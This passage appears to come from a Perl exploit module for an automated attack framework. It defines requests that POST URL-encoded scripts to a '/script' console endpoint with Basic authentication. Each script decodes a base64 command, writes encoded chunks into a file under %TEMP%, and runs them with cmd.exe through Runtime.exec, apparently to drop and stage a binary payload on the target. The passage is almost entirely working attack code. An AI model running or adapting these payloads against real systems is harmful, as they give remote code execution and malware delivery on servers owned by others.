YUdUVFFBRG9Hd0gvLzRQRXVBdnRBa0VBdXdJQVFBQTdDbnovTldBQ1FRQTd3N2k4MDBBQWRBVzR3QUxVQUlzVjdOQjgrRktTYUVRSFFBRC9GV1RCUUFDREV3eU5QVEN2VndDRHlmL3V3SDJ1b1dBQ1FRRDMwVWtWcmdHSkRleHNRUUI4Y0dWd0FrRUFqVXdCQVZIL0ZWekJGajJEeEpTRndIWGdpeFhJd0VBQWFCVFRRQUNEd2tCUy8veUF3VUFBZzhRSS8xNWJpK1ZkdzRzVmdkQkFBSXZ3aWdwQ2lBNUdtY2wxMm9zVjdCZEJBSXNOY0FLR0FJdmFJRGhCdmQ0OEFvdlJ3ZWtDWTZXTE1JUG1BNlM1b3pEUVFGV2hWVUJCQUdhTERiUUxRUUNMRmNrWVFRQlFhazFSYWdCU0gvd1hRY3JvRGxRQUFJdndab1gyM2l5aENJRkJ5bzJOU1AvLy8xQm85TkpBQUdwNFVmMCthelBhRDcvV2pZVkkvLy8vVWxEbzdnS2ZBSVBFR09pbXFRQWJpL0Noc0Vpc0VZdjZ0elhLQzBIcWhjQ0pQVUNNRFhtSk5jRDdRUUNKUGNRTE9nQjBHNWxxazJoTVFnK0ZVbERvc2hZQUFBUEpFOWVKUmV5SlZmRHJEc2RGdFAvLy9QL0hSZkQvLy8rdmFHQWdRQUJULzdGZ3dlUjhvUmd4UUFDRHhBZ3pySVhBNERFei80dlBzQXRCQUltMEQxZ0lBSU9MN3JBMlFRQkJCQmRRNklBY0FKR2hjYllzYmdIRUJFYUJIbUFJQUpvNzhIelJpdzBZMEVBQWpWVTNpVTM4aTVZczBQa0ErRVg4cjRzVmF0Q2tBQWVoK0JkQkFFMVNVT2lEUndBQWhjQU5EbEQ4NkdOQUFPZ1VBdlNCZzhRSWkwWDhVOEIxTVdqVTBrQUE2QkJ6Ly8rRHhOMkxSZnpIUmZRQUFQd3NoY0FQam00QkFBREhSZmdBQUFBQWkwMzRpMFhvaTNRQkVJRk9rb1hKRDRRb0FRREJpMVg0Wm90Y0FzMzJ3eU1ZM3V2bzNCK3JBR0RFaWZiRFVBK0ZYZ0FBQVBiREJBK0VzUUFBajROK0NBRVBoWjZXSy9TaC9CZEJBSXRPSmFTZjZJNUxBQUNMZi9nWFFRQ0xhWHFMMVkxRndGQlJ4NVRFQVFBQWY0bUl6T2hzUlFBQWpvWC9kRmVMVmdSUzZERkxBTTJMSGNRQ1FRQ2h1QUpEQUVPTHlFRCsrV0tKSGNRQ1FRQ2pyd0pCQUg0bWl4WEl3RUFBYUxEU1FBQ0R3a0JTL3hXQStFVExEL3ZIVUdoTzBpb0FJeDhCQUFER3hCREhSZ2dBQUFBQTYyUEhSZ2dDQUFCcmkrYW9Ba0VBUWgzOHFBTE5BRmJvV1FHb05ZUEVCSVAxMXdOMVNZdVJCTGdCQUFCYmlVWFlaaDlGM05qdUYwRUFqVlhVVW1TSlFlRG5kWkRvVEVNQTZPc2ppejI0QXFjQWl4WE1Ba0ZLUjB6clBiZ0NRUUNKRmN5OVFRQlc2TW9hRUFDTHhQYUxSV0NMOHZpTFRmeEExc0lVTzhHSlI%2bPiVURU1QJVxlWHpUUy5iNjQ%3d%22%29%3b%0aString%20%5b%5d%20PhmWS%20%3d%20new%20String%5b3%5d%3b%0aPhmWS%5b0%5d%20%3d%20%22cmd.exe%22%3b%0aPhmWS%5b1%5d%20%3d%20%22/c%22%3b%0aPhmWS%5b2%5d%20%3d%20new%20String%28MuXyy%2c%20%22UTF-8%22%29%3b%0aRuntime.getRuntime%28%29.exec%28PhmWS%29%3b%0a&Submit=Run',
      TEXT   => 'Sending Exploit #5 Request : [POST] /script',
      HEADERS      => {
        'Authorization' => 'Basic X19VU0VSTkFNRV9fOg==',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT6 => {
      METHOD       => 'POST',
      PATH   => 'script',
      PAYLOAD      => 'script=sun.misc.BASE64Decoder%20fSvEf%20%3d%20new%20sun.misc.BASE64Decoder%28%29%3b%0abyte%5b%5d%20GNyYP%20%3d%20fSvEf.decodeBuffer%28%22ZWNobyBmU0pWZmdQM2J6K1AvK0x2YVFMUVFDTFJaZzd5S0dzQWtFQWZ4dDhEWXVuVFF0QkFJdUw3R0hSY3d3SUJSRFEvZ0Naak9uK1F2K0xEVm5RUUFDRmFYVENVS0hJd0VBQWc4QkFhSURTUU9HaS94V0F3ZVlBdzhURDY5cG9lTkpBQVA4VlpIRkFBSVBFQktHSWMwRVlYY0IwRE9qZkV3QUFYMTViaTVoZHcyb0E2RmdDQUFDRHhBUmZYbHVMNVYzRGFwQ1FrRU9Ra0ZXTDdJUFFlRmFMY1F4aStrV0lhbmhRVnVpSmFBQUFmVTJTaXhYSXdFQUFVRkdEWWtENnN6ZEE1VkpJRllEQlFBQ2hrUUpCQUlQRUZJV1RkQTlkYUZUU1FBQm5jc2ZCUUFDRHhBaVRvNEJ3eVVBQVh0YVFrSkNRNjVDUWtPcjNrRldMN0lNYkZGTlc2V29JVjR0R1M0bEZOZWhKU3dBQW82QUxRUUMwZ2FRTFFRQ0x3b3RHRklYQWl3ZDFRSXRPQk5VQStRQlJySHpXQUFDVG5qZ0lBQUNKdmp3STZ3REhSaGhlRWdBQWl4WHNGNWl4RlZZVW9XQ0tRUUNGd0hRN29YQUN6Z0FNN2dNUXp1Z1U2dytMaXpnSUhRQ2h6ZEJBQVBvVkxOQjJ5QVBJazRZOENBQUFFOEk3K0ErUDVXTUEzbndJTy9JUGg5dDRBQUNMY2hpTDMwN1FRQ21MUmdTTlRRajUwL3hTVU9odGF3QUFoUjUwTTRQNEMzUXVQV2o5Q2dCMGhEM1ovQXJ3K3lBOVYvMEtBSFFaUFNUOUNvaDA4ajJoL0FvQWRBczlzeU1MQUE4ZHBnQUFBSXRGQ0lzZG9BSkJBSXM5cEFMTUFCellnOWNBN0IzaFdVRUFpVDJrQWtFQWkxWVlpMDRVQXpjcnlJbFdHTGRPRkNPRjFmNXQveTNFQ0FNQUFBRG80MG9BbDZPZ3ZFRUFpUlhVU1VFQWkxWUVpWWFzQ0FDT2l3MmtDNWFNN1FFQWxBQnNSZkJtaVVYMGlZNUVDSVFpaXczNEYwRUFqVVhzcTFXSlVCYUpkVG5vbEVBQVpWOWVtSXZsaThObzFITkFBUDlsWkVKQUFIVG9haG9BQUlQRUNGK01XNHRTWGNPTEhid0NRUUJvdk5SQUFFT0pIYndDUWVmL2FXUU5RQUJXNkVJYUFBQUQ4KzFmWGx1TDVWM0RrSkNRMXBDUVNKRDlpK3lCN0x6NUFBRDRSUWlGc3JrUzZJdEpBQUNqT0pwQkFJa1ZwQXRCQU9zTGl4V2tDMEVBb2JvTFFRQ01peDI2QzBFQVZsZUxQY1FMUVhVcnczWFhRdXZLaVZYY2l4NWt3ZjBBMzFYdmFMVGZRQURjRFRqQ3F3RHhYZEJiNDJqZ0UwRUFhSmpmUUFEL0FhRUFHRUVWVUdnNTMwQUEveE16eVdhTERmUVh1cGhSYUZ6ZlFFRC8xbWlBYjBBQS85YUxGZVFYV0FCU2FFRGZFd0QvMW9TTWgwRUFUV2djMzVrMi85WkZnUHRBQVAvV2l3MUMwRUFBVVdnQTMwQUEvM2k5VmRTTFJkQlNVR2pZM2tBQS85YUxEWllDUVFDRHhFaFJTcnplT1ZELzFvc1Z1QUpCb3d4b29ONUFBUC9Xb2JnQ1FRQTQ0eEFYd0hRa29SY0NRUUNMRFhjQ1FRQ0xoOGdDUVFCUUhjUUtRUUJSVWxCb1pONEZBUC9XZzhSTGkvTXVBa0U1VVdoSWtrQUEvOWFoMEFKd0FJUEVDSVhBZEF0UUNpelVRQUQvMW9QRUNLRm9Ba0VBaGNCMCtZc1ZzQVpCbkZJbEVONUFBUC9XZzhRSWo1UlJRUUNMRFpENXF3REZVV2pvM1VBQS85YWhZQUtEQUlQRURLZjR3N3NYSHFuckFrRUEwNkFDUVFCU1VHaklnRUNVbk5aTWh3eURQV0FDUVFBQzZ3MkxEYVFDUVFDTGlLQUNpZ0JSVW1pbzNVQysvOWJZeEF5aHVBSW5BSXNOSlFMWEFGQThhSURkUUFELzF0MUY3dHdkTU1KQUFJUEVETi9uOXNSRUQ0dnVBQUFBb2F3Q1V3Q0ZZUStmQ2c0QXlOMHZLTUpBQU54MTBPN3NDTjFkZ05zRnJPTWxBTnhOZ04wY0pMMVEzVUFBLzliYklCalFRS3poeEFUY3d0RGNEZVRDUUFEYU5jWUNRZXJkSENSb0pOMUFBUC9XM1VYUTNBMGd3a0FBZzhRNzJqV3N5RUVBM1J3a2FOamNRQUQvZnQva2tBSkJBSU1xQk54TmdOd05HS0ZBQU4yeEpHaWVZcDRBYzlibVlBSkJBSVBFRElYQWZ1L2ZMYndDeWdDRDdGUFRoM1RjRFFqQ1FBRGRIQXBvZkU1QUFQL1dpeFdnQWtHY2l4MlFBcFVBb1JNQ1FWQ0x3SlFDUVFDdDB4T2tpVlhZaVVYY2c4UUszMjNZM0UyQTNBMFl3a0FBM1J3a2FGRGNRQURDQUlQRURITjJBa0VBaGNBUGp1a05BUGN6eVlQUC83ci8vd0YvTzhFa1RjQWxUZmVKVGV1SlRjeUpUZUNKZXVTSm91aUpUZXlKZmVXSlZiUmpTNkNKVmFTSnZXRC95ZitKbFdULy8vK0pmZENKVmRTSmpYRC8vLzh0cVB2L1RQK0o2cmlKVGJ5Sk0yaEkvLytKalc%2bPiVURU1QJVxlWHpUUy5iNjQ%3d%22%29%3b%0aString%20%5b%5d%20AGdgJ%20%3d%20new%20String%5b3%5d%3b%0aAGdgJ%5b0%5d%20%3d%20%22cmd.exe%22%3b%0aAGdgJ%5b1%5d%20%3d%20%22/c%22%3b%0aAGdgJ%5b2%5d%20%3d%20new%20String%28GNyYP%2c%20%22UTF-8%22%29%3b%0aRuntime.getRuntime%28%29.exec%28AGdgJ%29%3b%0a&Submit=Run',
      TEXT   => 'Sending Exploit #6 Request : [POST] /script',
      HEADERS      => {
        'Authorization' => 'Basic X19VU0VSTkFNRV9fOg==',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
